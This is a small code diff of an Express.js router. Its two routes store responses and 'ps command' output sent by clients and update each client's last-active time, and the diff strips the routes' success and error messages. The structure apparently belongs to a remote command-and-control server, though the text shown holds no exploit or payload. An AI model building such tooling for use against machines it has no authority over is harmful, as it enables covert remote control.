@@ -20,8 +20,8 @@ router.route('/ps').post((req, res) => {
     const response = req.body.response;
     const newPsResponse = new psResponse({response_id: response_id, client_id: clientId, response: response});
     newPsResponse.save()
-        .then(() => res.send('ResponsePS added successfully!'))
-        .catch(err => res.status(401).send(`Error adding ps command ${err}`));
+        .then(() => res.send())
+        .catch(err => res.status(401).send());
 });
 
 
@@ -38,8 +38,8 @@ router.route('/').post((req, res) => {
         date: currentTimeDate
     });
     newResponse.save()
-        .then(() => res.send('Response added successfully!'))
-        .catch(err => res.status(400).send(`Error adding response ${err}`));
+        .then(() => res.send())
+        .catch(err => res.status(400).send());
     Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
         function (err) {
             if (err)
